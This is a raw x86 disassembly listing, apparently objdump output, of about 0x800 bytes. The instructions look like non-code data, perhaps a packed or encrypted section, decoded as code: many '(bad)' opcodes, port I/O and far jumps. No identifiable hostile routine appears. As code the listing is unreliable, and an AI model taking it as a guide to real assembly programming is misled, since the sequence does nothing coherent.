  41607b:	neg    DWORD PTR [ebx+edx*4]
  41607e:	repz sub al,0xd9
  416081:	dec    ebp
  416082:	mov    edx,0x7557550a
  416087:	mul    BYTE PTR ds:0x8bfad620
  41608d:	es test eax,0xdf9da33
  416093:	adc    al,0xdc
  416095:	inc    edi
  416096:	sbb    DWORD PTR [edx+0x13665443],0x38
  41609d:	mov    ?,WORD PTR [ebp+0x35]
  4160a0:	sub    DWORD PTR [ecx+0x3ad3726f],0x51
  4160a7:	inc    ebp
  4160a8:	call   0x6c92f36
  4160ad:	hlt    
  4160ae:	shl    bl,1
  4160b0:	push   ebx
  4160b1:	mov    bh,0x4
  4160b3:	inc    ecx
  4160b4:	cmp    al,0x7d
  4160b6:	jb     0x4160b8
  4160b8:	pop    ds
  4160b9:	xlat   BYTE PTR ds:[ebx]
  4160ba:	lock sub BYTE PTR [ebp-0x592fa2be],0x7a
  4160c2:	or     eax,0x1094d0f8
  4160c7:	sbb    al,0xce
  4160c9:	mov    dh,0x64
  4160cb:	outs   dx,DWORD PTR ds:[esi]
  4160cc:	or     al,0xd3
  4160ce:	ret    
  4160cf:	cmp    al,0x61
  4160d1:	push   esi
  4160d2:	xor    ch,ah
  4160d4:	jmp    0xb0e3:0xbfff968a
  4160db:	shl    DWORD PTR [ecx-0x62a35317],1
  4160e1:	popf   
  4160e2:	and    esi,DWORD PTR [bx+si-0x36]
  4160e6:	fild   QWORD PTR [eax+0x604d0432]
  4160ec:	test   DWORD PTR [eax+0x68],0x89eba6c0
  4160f3:	ja     0x416095
  4160f5:	xor    eax,0xd4b581b1
  4160fa:	outs   dx,DWORD PTR ss:[esi]
  4160fc:	mov    bh,0xe0
  4160fe:	cli    
  4160ff:	dec    ecx
  416100:	inc    esp
  416101:	cmp    esi,DWORD PTR [ebx-0x28]
  416104:	test   al,0x55
  416106:	jmp    0x4160d9
  416108:	mov    ebp,edx
  41610a:	shl    DWORD PTR [ebp-0x6e1701fa],1
  416110:	push   eax
  416111:	pusha  
  416112:	es out 0x2,al
  416115:	dec    ebp
  416116:	stos   DWORD PTR es:[edi],eax
  416117:	jns    0x416172
  416119:	and    DWORD PTR [ecx-0x3b],edi
  41611c:	out    dx,eax
  41611d:	mov    ebp,DWORD PTR [edi]
  41611f:	int3   
  416120:	pop    ebp
  416121:	lds    esp,FWORD PTR [eax-0x5d128292]
  416127:	or     bh,BYTE PTR [ebx+0x22e38ddf]
  41612d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41612e:	pop    edx
  41612f:	ins    BYTE PTR es:[edi],dx
  416130:	sbb    eax,0x2763734d
  416135:	fnstcw WORD PTR [eax]
  416137:	pop    ebp
  416138:	mov    bl,0x2d
  41613a:	lea    ebp,[ebx]
  41613c:	mov    ebx,0xf8e525ab
  416141:	push   ss
  416142:	scas   al,BYTE PTR es:[edi]
  416143:	rol    DWORD PTR ds:[edi],1
  416146:	xchg   ebx,eax
  416147:	mov    BYTE PTR [esp+edx*8-0x4c868128],bl
  41614e:	out    0xda,eax
  416150:	jmp    0xc5b8:0xb43e7d9
  416157:	cmovb  ebx,DWORD PTR [eax+0xcb08bc4]
  41615e:	adc    BYTE PTR [eax-0x78],ah
  416161:	fwait
  416162:	or     eax,DWORD PTR [ebx+0x5503d0ae]
  416168:	jle    0x41610a
  41616a:	in     eax,0x96
  41616c:	cld    
  41616d:	inc    ebx
  41616e:	cs inc edi
  416170:	mov    eax,ds:0x43cbde4f
  416175:	fs pusha 
  416177:	in     eax,dx
  416178:	les    eax,FWORD PTR [edi]
  41617a:	int3   
  41617b:	pushf  
  41617c:	test   al,0x56
  41617e:	in     al,dx
  41617f:	adc    eax,edi
  416181:	inc    edi
  416182:	test   al,0x4
  416184:	dec    esp
  416185:	mov    cs,WORD PTR [edi]
  416187:	dec    esp
  416188:	cli    
  416189:	sub    eax,0xc324e389
  41618e:	push   ebx
  41618f:	gs je  0x41619c
  416192:	mov    al,ds:0xab669ab3
  416197:	mov    ebp,DWORD PTR [ebp+0x19]
  41619a:	sbb    BYTE PTR [eax+0x1cee8ad7],ch
  4161a0:	push   ds
  4161a1:	dec    edi
  4161a2:	cwde   
  4161a3:	jmp    0xaf9fc5b6
  4161a8:	ins    DWORD PTR es:[edi],dx
  4161a9:	pop    es
  4161aa:	shr    BYTE PTR [edi+edi*4-0x7],cl
  4161ae:	jge    0x416216
  4161b0:	xchg   ebx,eax
  4161b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161b2:	outs   dx,DWORD PTR ds:[esi]
  4161b3:	outs   dx,BYTE PTR ds:[esi]
  4161b4:	sub    al,0x61
  4161b6:	dec    edi
  4161b7:	out    0x87,al
  4161b9:	mov    ah,0x33
  4161bb:	int3   
  4161bc:	cmp    BYTE PTR [ebp+eax*8+0x28],dl
  4161c0:	mov    ds:0xfd9bec95,eax
  4161c5:	jb     0x416202
  4161c7:	les    esi,FWORD PTR [ebp-0x3adeba25]
  4161cd:	xchg   cl,ah
  4161cf:	mov    ah,0xa8
  4161d1:	sbb    eax,0x46e39eef
  4161d6:	fadd   st,st(2)
  4161d8:	popa   
  4161d9:	jmp    0x41621a
  4161db:	mov    ds:0x555fc514,eax
  4161e0:	adc    al,0x8e
  4161e2:	(bad)  
  4161e5:	jb     0x4161f8
  4161e7:	aaa    
  4161e8:	sbb    cl,BYTE PTR [edi]
  4161ea:	dec    esp
  4161eb:	mov    eax,0xcad5343a
  4161f0:	data16 out dx,al
  4161f2:	imul   eax,edi,0x4fe688ff
  4161f8:	inc    esi
  4161f9:	es xchg esp,eax
  4161fb:	cs inc ebx
  4161fd:	aad    0x31
  4161ff:	mov    eax,ds:0x93e82eb
  416204:	call   DWORD PTR [esi]
  416206:	out    0xdf,eax
  416208:	ret    0x2d59
  41620b:	(bad)  
  41620c:	aad    0xda
  41620e:	out    dx,eax
  41620f:	or     bl,BYTE PTR [edx-0x59bff99e]
  416215:	inc    ecx
  416216:	add    DWORD PTR [ecx+edx*4-0x21a78c33],0xda22863b
  416221:	mov    ds:0x3f4051df,eax
  416226:	mov    bh,0x69
  416228:	in     eax,0x5e
  41622a:	fsubp  st(1),st
  41622c:	aam    0x17
  41622e:	pop    eax
  41622f:	mov    ds:0x8bda15f0,al
  416234:	psrad  mm3,QWORD PTR [edx-0x60]
  416238:	arpl   WORD PTR [edi+edi*4+0x77cc031a],bp
  41623f:	push   0xf70477da
  416244:	ud0    eax,DWORD PTR [edi-0x51]
  416248:	and    DWORD PTR [esi-0x7f977eb7],0x3543827e
  416252:	inc    esp
  416253:	xor    ch,BYTE PTR [edx-0x51]
  416256:	mov    edx,0xd2dbf0a4
  41625b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41625c:	aad    0x33
  41625e:	fimul  WORD PTR [edi-0x566f331b]
  416264:	loopne 0x41629c
  416266:	xchg   esi,eax
  416267:	adc    ah,BYTE PTR [edx+0x12]
  41626a:	out    0xe6,eax
  41626c:	push   esp
  41626d:	jbe    0x4162a1
  41626f:	mov    bl,0xac
  416271:	add    al,0x56
  416273:	in     al,dx
  416274:	(bad)  
  416275:	fidiv  DWORD PTR ds:0xc3f7fdcc
  41627b:	rcl    DWORD PTR [eax+0x4c],cl
  41627e:	xchg   edi,eax
  41627f:	repnz retf 0xf8e7
  416283:	loope  0x416286
  416285:	push   ebx
  416286:	js     0x4162af
  416288:	pop    esi
  416289:	or     DWORD PTR [edx+0x4a73767e],edx
  41628f:	stos   DWORD PTR es:[edi],eax
  416290:	ret    0xbb54
  416293:	mov    cl,0xf3
  416295:	fs lock (bad) 
  416298:	or     eax,0x6bfa769
  41629d:	dec    edx
  41629e:	inc    ebx
  41629f:	rcr    BYTE PTR [esi],1
  4162a1:	popf   
  4162a2:	popf   
  4162a3:	and    esi,DWORD PTR [edx]
  4162a5:	mov    ch,0xb2
  4162a7:	jge    0x41624e
  4162a9:	idiv   ebp
  4162ab:	sbb    DWORD PTR [esi],ecx
  4162ad:	jae    0x41627c
  4162af:	arpl   WORD PTR [esp+edi*4+0x25],dx
  4162b3:	mov    edx,0xabfa41e4
  4162b8:	pop    edi
  4162b9:	dec    esp
  4162ba:	clc    
  4162bb:	jle    0x4162bb
  4162bd:	add    BYTE PTR [ebx-0x3b],ch
  4162c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c1:	(bad)  
  4162c2:	and    edx,DWORD PTR [ebx-0x304ef9d3]
  4162c8:	fst    QWORD PTR [ebx+0x2493607c]
  4162ce:	inc    ebp
  4162cf:	mov    esi,0x66f6965a
  4162d4:	ja     0x416293
  4162d6:	in     al,dx
  4162d7:	push   0x3e
  4162d9:	add    eax,0xdbbd190d
  4162de:	add    DWORD PTR [edx+0x5a],eax
  4162e1:	imul   ecx,esi,0xbb4115e1
  4162e7:	iret   
  4162e8:	into   
  4162e9:	jne    0x416362
  4162eb:	jl     0x4162e4
  4162ed:	cwde   
  4162ee:	inc    ebp
  4162ef:	jmp    0xb9b7:0x1730fa87
  4162f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162f7:	repz cdq 
  4162f9:	ficom  WORD PTR [ecx+0x4639a76d]
  4162ff:	sub    eax,0xa8b25099
  416304:	lock sbb DWORD PTR [esi+0x9],ecx
  416308:	mov    cl,0x99
  41630a:	push   cs
  41630b:	enter  0xfc89,0x98
  41630f:	ja     0x4162aa
  416311:	dec    esp
  416312:	(bad)  
  416313:	sub    ebx,DWORD PTR [esi-0x22]
  416316:	xchg   ebx,eax
  416317:	jae    0x41629d
  416319:	cli    
  41631a:	dec    edi
  41631b:	jge    0x41632e
  41631d:	in     eax,0xcf
  41631f:	add    DWORD PTR [edx+0x5fe52ee6],ebp
  416325:	aad    0x2d
  416327:	sub    esi,DWORD PTR [edi-0x6961c5eb]
  41632d:	ins    DWORD PTR es:[edi],dx
  41632e:	stos   BYTE PTR es:[edi],al
  41632f:	call   0x82b1:0x112ccd27
  416336:	and    BYTE PTR [ecx],0xc2
  416339:	sbb    dh,BYTE PTR [esi]
  41633b:	jb     0x416351
  41633d:	shl    esi,0xf2
  416340:	add    DWORD PTR [edx-0x2160d72e],esp
  416346:	bound  eax,QWORD PTR [eax-0x32cc4bb9]
  41634c:	or     DWORD PTR [edx-0x69],ebp
  41634f:	xor    DWORD PTR [ebx],eax
  416351:	adc    esp,DWORD PTR [ebp+0x26]
  416354:	ja     0x4163b1
  416356:	inc    edi
  416357:	lods   al,BYTE PTR ds:[esi]
  416358:	pusha  
  416359:	enter  0xab6e,0x48
  41635d:	out    dx,al
  41635e:	push   ebx
  41635f:	add    bl,BYTE PTR [ebx+ecx*2+0x3380b8fc]
  416366:	rcl    dl,0x73
  416369:	mov    al,ds:0x4930454f
  41636e:	adc    esp,DWORD PTR [esi+0x1]
  416371:	leave  
  416372:	cli    
  416373:	sub    al,0xd6
  416375:	or     BYTE PTR [esi+0x345c700e],cl
  41637b:	xchg   ebx,eax
  41637c:	pop    ecx
  41637d:	out    0xd6,eax
  41637f:	(bad)  
  416380:	outs   dx,DWORD PTR ds:[esi]
  416381:	pop    esi
  416382:	(bad)  
  416383:	sbb    edx,DWORD PTR [eax+0x121df49a]
  416389:	clc    
  41638a:	bound  eax,QWORD PTR [eax]
  41638c:	or     eax,0x3bbe667
  416391:	sub    al,0x24
  416393:	popa   
  416394:	inc    ebx
  416395:	jne    0x416318
  416397:	mov    ah,0x2b
  416399:	jmp    0x416396
  41639b:	(bad)  
  41639c:	nop
  41639d:	push   eax
  41639e:	jno    0x4163f7
  4163a0:	loop   0x41635b
  4163a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a3:	and    bh,BYTE PTR [ebp-0x7219f441]
  4163a9:	enter  0xd475,0xa2
  4163ad:	out    0xcc,eax
  4163af:	icebp  
  4163b0:	pop    ecx
  4163b1:	and    esi,DWORD PTR [ebp+0x4413a684]
  4163b7:	div    BYTE PTR [ebp+0x42]
  4163ba:	adc    edx,DWORD PTR [eax+0x3c]
  4163bd:	sbb    ah,bl
  4163bf:	add    edx,DWORD PTR [edi+0x7fd631ef]
  4163c5:	mov    dl,0xc7
  4163c7:	repnz call 0x946a:0xd8f658ca
  4163cf:	sahf   
  4163d0:	fs scas eax,DWORD PTR es:[edi]
  4163d2:	outs   dx,DWORD PTR ds:[esi]
  4163d3:	inc    BYTE PTR [edx+0x39]
  4163d6:	ficomp DWORD PTR [edx-0x27c0ab30]
  4163dc:	dec    esi
  4163dd:	or     DWORD PTR [esi-0xe],eax
  4163e0:	jmp    0x62cf2901
  4163e5:	loopne 0x416382
  4163e7:	stos   DWORD PTR es:[edi],eax
  4163e8:	popf   
  4163e9:	or     BYTE PTR [ebp+0x0],ah
  4163ec:	cs jg  0x4163b0
  4163ef:	fnstenv [edi+0x16571f69]
  4163f5:	fld    DWORD PTR [esi-0x7f7bcb61]
  4163fb:	xchg   dl,ah
  4163fd:	loopne 0x416470
  4163ff:	stc    
  416400:	out    dx,al
  416401:	push   esi
  416402:	or     al,0xea
  416404:	and    bh,dl
  416406:	dec    esi
  416407:	add    BYTE PTR ds:0x7e2c280a,al
  41640d:	cmp    cl,dh
  41640f:	push   esp
  416410:	xchg   ebx,eax
  416411:	scas   al,BYTE PTR es:[edi]
  416412:	mov    ecx,0xdf123f6c
  416417:	push   0xffffffa1
  416419:	cmp    DWORD PTR [edi+0x5d],0xbce00c0a
  416420:	mov    ebx,edi
  416422:	retf   
  416423:	test   BYTE PTR [eax],dl
  416425:	mov    bl,0x97
  416427:	mov    edx,0xd09accb8
  41642c:	retf   
  41642d:	cmp    BYTE PTR [ecx-0x76],ch
  416430:	sbb    eax,0xa9b7746a
  416435:	and    eax,DWORD PTR [eax+eax*8]
  416438:	and    DWORD PTR [esi],esp
  41643a:	pop    edx
  41643b:	fxch   st(2)
  41643d:	lea    eax,[esi-0x73]
  416440:	test   eax,0xc83742d3
  416445:	adc    BYTE PTR [ebx],ch
  416447:	addr16 (bad) 
  416449:	fsub   DWORD PTR ds:0x54603c5c
  41644f:	cmp    bl,BYTE PTR [edi+0x40]
  416452:	mov    ebx,0xd2ba31e0
  416457:	jnp    0x41645b
  416459:	pop    edx
  41645a:	xchg   esp,eax
  41645b:	adc    eax,0x6c5649b3
  416460:	add    esi,ecx
  416462:	inc    ebx
  416463:	std    
  416464:	in     eax,0x54
  416466:	mov    esi,0xbc93e20f
  41646b:	popa   
  41646c:	pop    ebx
  41646d:	aam    0xa3
  41646f:	fwait
  416470:	add    ah,BYTE PTR [esi]
  416472:	xchg   ebx,eax
  416473:	mov    ch,0xc3
  416475:	loop   0x416438
  416477:	mov    WORD PTR [edi-0x43],?
  41647a:	lods   al,BYTE PTR ds:[esi]
  41647b:	mov    bl,0x10
  41647d:	daa    
  41647e:	mov    eax,0x9938866e
  416483:	mov    cl,0x3f
  416485:	cmp    edx,DWORD PTR [edx-0x3b]
  416488:	ja     0x41641c
  41648a:	dec    ecx
  41648b:	and    al,0x2f
  41648d:	pop    ss
  41648e:	inc    ecx
  41648f:	pusha  
  416490:	push   ecx
  416491:	and    eax,0x303b816e
  416496:	pop    ss
  416497:	stos   DWORD PTR es:[edi],eax
  416498:	add    esi,ecx
  41649a:	add    al,0x1d
  41649c:	fcom   DWORD PTR [eax]
  41649e:	mov    dh,0x8e
  4164a0:	mov    bh,0x9b
  4164a2:	cdq    
  4164a3:	mov    WORD PTR [edi-0x1e],?
  4164a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a7:	adc    esi,DWORD PTR [edx]
  4164a9:	sub    BYTE PTR [edx],dl
  4164ab:	jns    0x41648a
  4164ad:	xchg   BYTE PTR [ebx+0x3bdc90e5],ch
  4164b3:	fs inc edi
  4164b5:	les    esp,FWORD PTR [eax+ebx*1]
  4164b8:	lods   eax,DWORD PTR ds:[esi]
  4164b9:	jle    0x4164aa
  4164bb:	test   ch,al
  4164bd:	out    0xca,eax
  4164bf:	jge    0x416475
  4164c1:	bound  esi,QWORD PTR [esi]
  4164c3:	mov    eax,DWORD PTR [ebp+0x68]
  4164c6:	mov    ds:0xe7c2532f,eax
  4164cb:	pushf  
  4164cc:	cmp    ch,BYTE PTR [ebx+0x4c77d69e]
  4164d2:	shl    DWORD PTR [eax-0x2fcfd671],0x7f
  4164d9:	mov    ebx,0x87f64d6a
  4164de:	(bad)  
  4164df:	lds    ecx,FWORD PTR [esi]
  4164e1:	es (bad) 
  4164e3:	sbb    BYTE PTR [edx],bl
  4164e5:	cs xor bl,0x10
  4164e9:	int    0xd3
  4164eb:	sbb    bh,BYTE PTR [edi+0x66615cbf]
  4164f1:	push   es
  4164f2:	jo     0x4164ec
  4164f4:	out    dx,eax
  4164f5:	pop    ebx
  4164f6:	cmc    
  4164f7:	aaa    
  4164f8:	(bad)  
  4164f9:	js     0x416517
  4164fb:	cli    
  4164fc:	loopne 0x41650d
  4164fe:	(bad)  
  4164ff:	xchg   edi,eax
  416500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416501:	add    eax,0x5beb6341
  416506:	ins    BYTE PTR es:[edi],dx
  416507:	lock pop ebx
  416509:	adc    DWORD PTR [eax*2+0x1794eb26],ebx
  416510:	out    0x27,al
  416512:	out    dx,al
  416513:	test   BYTE PTR [esi+0x93d240b],0x25
  41651a:	imul   eax,DWORD PTR [edx-0x36],0x556b9bc0
  416521:	xor    edi,DWORD PTR ds:0xc16310a7
  416527:	dec    DWORD PTR [edx+0x58]
  41652a:	dec    esi
  41652b:	dec    esi
  41652c:	sbb    DWORD PTR [edi],edi
  41652e:	sahf   
  41652f:	ss out 0xdf,eax
  416532:	jecxz  0x4164dc
  416534:	adc    DWORD PTR ds:0x1c8df035,0xebe6ee9d
  41653e:	les    ebx,FWORD PTR [bp+si-0x53]
  416542:	dec    ebx
  416543:	(bad)  
  416544:	jnp    0x416568
  416546:	inc    esi
  416547:	mov    edx,0x612915df
  41654c:	and    al,0x88
  41654e:	je     0x416543
  416550:	cld    
  416551:	loopne 0x4165b5
  416553:	loop   0x41656a
  416555:	jge    0x416565
  416557:	adc    dh,BYTE PTR [edi]
  416559:	push   edi
  41655a:	cdq    
  41655b:	sbb    ebp,edx
  41655d:	(bad)  
  41655e:	mov    ebx,0x82cc1f1b
  416563:	pop    ebp
  416564:	es dec eax
  416566:	sub    BYTE PTR [edi+eax*2],0xac
  41656a:	dec    edi
  41656b:	lea    edx,[ebx-0x75]
  41656e:	ja     0x416597
  416570:	lock idiv BYTE PTR [eax+0x613f24ae]
  416577:	or     BYTE PTR [edi+0x50f1cf66],dl
  41657d:	mov    fs,WORD PTR [esi+0x491977aa]
  416583:	int    0xe1
  416585:	sti    
  416586:	ja     0x4165f8
  416588:	arpl   cx,sp
  41658a:	lock es data16 addr16 sub ah,dl
  416590:	cmp    al,0xba
  416592:	cmp    bl,BYTE PTR [ecx]
  416594:	cwde   
  416595:	xor    eax,0xddab20be
  41659a:	imul   BYTE PTR [edx-0x3b]
  41659d:	jmp    0x41651f
  41659f:	ror    DWORD PTR ds:[edx-0x74],cl
  4165a3:	inc    esi
  4165a4:	pop    ds
  4165a5:	test   eax,0xc9f87a45
  4165aa:	cmp    al,ch
  4165ac:	rcr    BYTE PTR ds:0xefbcd5b,1
  4165b2:	cmp    eax,DWORD PTR [ebp+0x73]
  4165b5:	mov    ebx,0x20491ea0
  4165ba:	push   ss
  4165bb:	fcmovnbe st,st(5)
  4165bd:	inc    esi
  4165be:	fbstp  TBYTE PTR [ebp+0x6f5a0d31]
  4165c4:	inc    ebx
  4165c5:	jg     0x416554
  4165c7:	or     al,0x7d
  4165c9:	mov    ebp,0xb2bc77ab
  4165ce:	stos   DWORD PTR es:[edi],eax
  4165cf:	inc    ebx
  4165d0:	ror    DWORD PTR [esi-0x69e28da6],cl
  4165d6:	or     bl,BYTE PTR [edx]
  4165d8:	push   cs
  4165d9:	aam    0x71
  4165db:	add    eax,0xaa198f9e
  4165e0:	pop    eax
  4165e1:	fisttp WORD PTR [ecx-0x1cdbd6a1]
  4165e7:	mov    ds:0x6b08279,al
  4165ec:	adc    edi,ebx
  4165ee:	mov    DWORD PTR [edx-0x76],ebp
  4165f1:	xor    DWORD PTR [ebp-0x36],0x4e
  4165f5:	out    0x33,eax
  4165f7:	jmp    0xfe68:0x11bfca5f
  4165fe:	ror    DWORD PTR [esi],1
  416600:	in     al,dx
  416601:	pop    esi
  416602:	jb     0x41665a
  416604:	nop
  416605:	cdq    
  416606:	inc    ecx
  416607:	pop    esp
  416608:	(bad)  
  416609:	sub    al,0xd
  41660b:	cs xchg ebp,eax
  41660d:	fisttp WORD PTR es:[ebx]
  416610:	inc    edx
  416611:	sub    bh,BYTE PTR [eax]
  416613:	mov    al,0x3d
  416615:	push   esi
  416616:	rcl    DWORD PTR [ecx+edx*4-0x3f0818a4],1
  41661d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41661e:	and    al,0x59
  416620:	ds jnp 0x416691
  416623:	lds    eax,FWORD PTR [esi]
  416625:	cmp    DWORD PTR [edx+0x737eddca],ecx
  41662b:	push   ebp
  41662c:	scas   al,BYTE PTR es:[edi]
  41662d:	inc    edi
  41662e:	push   esi
  41662f:	in     al,0xf7
  416631:	mov    ah,0xae
  416633:	scas   eax,DWORD PTR es:[edi]
  416634:	rol    DWORD PTR [edx+0x16003857],cl
  41663a:	rcl    DWORD PTR [edx],1
  41663c:	mov    al,0xe0
  41663e:	jmp    0x2e57:0x63e4cc8f
  416645:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416646:	inc    eax
  416647:	stc    
  416648:	outs   dx,DWORD PTR cs:[esi]
  41664a:	inc    ebp
  41664b:	gs inc edx
  41664d:	punpckhwd mm5,QWORD PTR [ecx+0x3b]
  416651:	test   dl,0xba
  416654:	mov    al,0xed
  416656:	mov    eax,ds:0x23002f73
  41665b:	(bad)  
  41665c:	cdq    
  41665d:	lock sub bl,BYTE PTR [eax-0x1]
  416661:	ret    
  416662:	jmp    0x4610:0xb794fb13
  416669:	lds    eax,FWORD PTR [ecx+ebp*4-0x30]
  41666d:	jnp    0x416639
  41666f:	jno    0x416600
  416671:	jne    0x4166c1
  416673:	in     al,0x16
  416675:	ja     0x4166d7
  416677:	in     eax,dx
  416678:	pop    esp
  416679:	mov    esp,DWORD PTR [edi+0x2]
  41667c:	xor    BYTE PTR [edx+0x5e],0xc3
  416680:	fdiv   DWORD PTR [esp+ebx*2+0x4e]
  416684:	pop    esi
  416685:	test   eax,0x874a30b1
  41668a:	push   ss
  41668b:	sahf   
  41668c:	popa   
  41668d:	mov    ebp,0xe7d2e81b
  416692:	fs lahf 
  416694:	pop    ebp
  416695:	outs   dx,BYTE PTR ds:[esi]
  416696:	ret    0x6a36
  416699:	dec    esp
  41669a:	and    dl,BYTE PTR [edx-0x8]
  41669d:	fimul  WORD PTR [edx-0x7f7f3592]
  4166a3:	cmp    al,0xa1
  4166a5:	fnsave [esi-0x39]
  4166a8:	mov    ebx,0x1278cfdb
  4166ad:	jns    0x41668b
  4166af:	imul   eax,DWORD PTR [esp+ebx*1+0x4b],0x96ad39f0
  4166b7:	jne    0x4166b7
  4166b9:	sti    
  4166ba:	jae    0x4166cf
  4166bc:	call   0x8bca:0x60889ee0
  4166c3:	fs push cs
  4166c5:	jns    0x41673a
  4166c7:	rcr    DWORD PTR [ebx+0x4f208e63],0x6e
  4166ce:	push   esi
  4166cf:	mov    dl,0xc4
  4166d1:	ins    DWORD PTR es:[edi],dx
  4166d2:	cdq    
  4166d3:	cli    
  4166d4:	push   cs
  4166d5:	cmp    ch,BYTE PTR [ecx+0x73b7a665]
  4166db:	in     eax,0xb8
  4166dd:	push   ecx
  4166de:	leave  
  4166df:	pop    edi
  4166e0:	mov    al,ds:0x180fb052
  4166e5:	xchg   ecx,eax
  4166e6:	cmp    ebp,eax
  4166e8:	scas   eax,DWORD PTR es:[edi]
  4166e9:	push   eax
  4166ea:	ja     0x416746
  4166ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166ed:	cmp    eax,0xf7178b7d
  4166f2:	inc    eax
  4166f3:	sbb    BYTE PTR [ebp+0x13],cl
  4166f6:	clc    
  4166f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f8:	pop    ecx
  4166f9:	fwait
  4166fa:	(bad)  
  4166fb:	(bad)  
  4166fc:	stos   BYTE PTR es:[edi],al
  4166fd:	xchg   edi,ecx
  4166ff:	jle    0x4166ab
  416701:	mov    edi,0x56c48052
  416706:	push   edx
  416707:	popf   
  416708:	push   ecx
  416709:	push   0x3af6a7
  41670e:	out    0x5d,eax
  416710:	adc    dl,BYTE PTR [ecx-0x450cb96f]
  416716:	push   edx
  416717:	xchg   esp,eax
  416718:	fist   WORD PTR [ebx+0x6444c7db]
  41671e:	and    bl,BYTE PTR [ecx+ebx*1+0xa]
  416722:	cmp    bl,BYTE PTR [ecx-0x335cc127]
  416728:	clc    
  416729:	stos   DWORD PTR es:[edi],eax
  41672a:	cmp    DWORD PTR [ebx+0x2050cd8a],ecx
  416730:	dec    esi
  416731:	mov    al,0xde
  416733:	push   edi
  416734:	not    BYTE PTR [ebp-0x1a]
  416737:	mov    ebx,0xa207ba73
  41673c:	mov    ah,0x5a
  41673e:	bound  esp,QWORD PTR [edx]
  416740:	cmc    
  416741:	enter  0xc2e9,0xd0
  416745:	cmp    eax,ebx
  416747:	call   0xccd0:0x92e8156b
  41674e:	xor    eax,0x9f5a369c
  416753:	rcl    edx,cl
  416755:	pop    eax
  416756:	sbb    dl,BYTE PTR [ebx]
  416758:	les    ebx,FWORD PTR [edx+0x55]
  41675b:	jl     0x416767
  41675d:	rcl    DWORD PTR [ebx-0x48],1
  416760:	out    0x48,al
  416762:	sub    ah,BYTE PTR [ecx+edx*8-0x61]
  416766:	outs   dx,BYTE PTR ds:[esi]
  416767:	adc    edi,eax
  416769:	xchg   BYTE PTR [ebp+ebp*4-0x12],ch
  41676d:	inc    ecx
  41676e:	or     al,0xb7
  416770:	push   0x94cd51b4
  416775:	jg     0x416768
  416777:	lods   eax,DWORD PTR ds:[esi]
  416778:	push   ebx
  416779:	mov    ?,WORD PTR [edx-0x1a656fee]
  41677f:	or     bh,dh
  416781:	stos   DWORD PTR es:[edi],eax
  416782:	cmp    al,0xdd
  416784:	xor    DWORD PTR [ebx],ecx
  416786:	add    ebp,DWORD PTR [edx+edi*2-0x348edf6d]
  41678d:	js     0x41671f
  41678f:	xchg   BYTE PTR ds:0x3de812d8,ah
  416795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416796:	sub    eax,0xdccad002
  41679b:	jecxz  0x41676c
  41679d:	sbb    al,0x2a
  41679f:	xchg   edx,eax
  4167a0:	push   ss
  4167a1:	add    al,0x7
  4167a3:	sub    al,0x1f
  4167a5:	fst    QWORD PTR [ebx+eiz*8-0xd]
  4167a9:	ja     0x4167d7
  4167ab:	jle    0x416800
  4167ad:	add    eax,0xbbec5bae
  4167b2:	sub    eax,0xf5265dc8
  4167b7:	imul   ebx,DWORD PTR [edi],0xffffffd5
  4167ba:	pop    esp
  4167bb:	ret    
  4167bc:	mov    WORD PTR [edx],ds
  4167be:	push   edi
  4167bf:	shl    DWORD PTR fs:0xba77b86c,0x64
  4167c7:	cmp    eax,0x28b49026
  4167cc:	fiadd  DWORD PTR [ecx-0x7dc7a8f6]
  4167d2:	test   al,0x9
  4167d4:	inc    eax
  4167d5:	retf   
  4167d6:	dec    eax
  4167d7:	adc    al,0xf2
  4167d9:	xor    dl,BYTE PTR [bx]
  4167dc:	test   eax,0x979e6490
  4167e1:	inc    edx
  4167e2:	xchg   edx,eax
  4167e3:	adc    al,0xb9
  4167e5:	ins    DWORD PTR es:[edi],dx
  4167e6:	xchg   BYTE PTR [esi+ebp*2-0x76],dl
  4167ea:	in     al,0xf2
  4167ec:	sub    DWORD PTR [ebx+ebp*2+0x655c309a],ecx
  4167f3:	mov    ebp,0xee81d373
  4167f8:	or     BYTE PTR [ebx+0x17],ch
  4167fb:	inc    ebp
  4167fc:	outs   dx,BYTE PTR ds:[esi]
  4167fd:	mov    bh,0xe6
  4167ff:	ret    
  416800:	mov    ebp,0xc8a9da51
  416805:	inc    ebp
  416806:	sbb    DWORD PTR [ebp-0x23826e90],edi
  41680c:	arpl   WORD PTR [ecx+0x567b336],sp
  416812:	mov    es,WORD PTR [eax-0x9]
  416815:	inc    edi
  416816:	jbe    0x416880
  416818:	fs es fs xchg esp,edx
  41681d:	(bad)  
  41681e:	xchg   ebp,eax
  41681f:	and    DWORD PTR [ecx+0x6a],ecx
  416822:	sbb    BYTE PTR [ecx+ecx*8+0x34aeb7ce],al
  416829:	sbb    dh,BYTE PTR [ebx+0x2c85cc68]
  41682f:	les    edx,FWORD PTR [ebx]
  416831:	retf   
  416832:	xchg   esi,eax
  416833:	mov    ecx,0x27e832af
  416838:	jns    0x41683d
  41683a:	stos   BYTE PTR es:[edi],al
  41683b:	dec    esp
  41683c:	vpand  xmm3,xmm4,XMMWORD PTR [edi-0x8bcb120]
  416844:	cs cwde 
  416846:	add    edx,ebp
  416848:	loope  0x416876
  41684a:	(bad)  
  41684b:	dec    edi
  41684c:	paddd  mm7,QWORD PTR [ebx+0x221aa700]
  416853:	pop    es
  416854:	mov    ebp,0x4c503e6
  416859:	push   ecx
  41685a:	pushf  
  41685b:	in     eax,dx
  41685c:	pop    eax
  41685d:	cwde   
  41685e:	jb     0x4168b0
  416860:	loop   0x416880
  416862:	or     esp,0x27b93764
  416868:	mov    dh,0x12
  41686a:	jno    0x4168be
  41686c:	fsub   DWORD PTR [ecx+edi*1+0x8d96f5b]
  416873:	ds jns 0x4168a8
  416876:	push   edx
